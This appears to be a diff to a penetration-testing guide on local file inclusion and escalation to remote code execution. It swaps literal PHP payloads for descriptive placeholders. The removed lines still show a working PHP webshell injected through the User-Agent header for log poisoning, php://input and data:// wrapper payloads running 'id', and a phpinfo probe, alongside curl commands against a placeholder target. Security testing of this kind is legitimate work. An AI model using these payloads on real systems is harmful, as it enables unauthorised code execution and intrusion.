@@ -98,7 +98,7 @@ size change:
 - `/etc/hosts`   → `127.0.0.1` plus `localhost`.
 - `/proc/self/environ` → `PATH=` / `HTTP_USER_AGENT=`.
 - Windows `win.ini` → `[fonts]` / `[extensions]` / `for 16-bit app support`.
-- PHP `php://filter` base64 read → a long base64 blob that decodes to `<?php`.
+- PHP `php://filter` base64 read → a long base64 blob that decodes to a PHP open tag.
 
 Treat ANY of: a content-length delta vs. a known-bad baseline, a new MIME type,
 or a partial match (e.g. only `root:x:0:0` with the rest truncated) as a
@@ -244,7 +244,7 @@ If LFI is confirmed, attempt to escalate to remote code execution.
 ```bash
 # PHP LFI to RCE via log poisoning
 # Step 1: Inject PHP code into access log
-curl -s -A "<?php system(\$_GET['cmd']); ?>" \
+curl -s -A "a PHP cmd-exec webshell (runs the 'cmd' GET param)" \
   "https://target.example.com/"
 
 # Step 2: Include the log file via LFI
@@ -255,14 +255,14 @@ curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode
 
 # PHP wrapper for code execution
 curl -s -X POST \
-  -d "<?php system('id'); ?>" \
+  -d "a PHP probe (runs: id)" \
   "https://target.example.com/page?file=php://input"
 
 # PHP data wrapper
-curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+curl -s "https://target.example.com/page?file=data://text/plain;base64,<base64 of a PHP system('id') probe>"
 
 # Include /proc/self/environ (if readable)
-curl -s -A "<?php phpinfo(); ?>" \
+curl -s -A "a PHP probe (phpinfo)" \
   "https://target.example.com/page?file=../../../proc/self/environ"
 
 # Session file inclusion
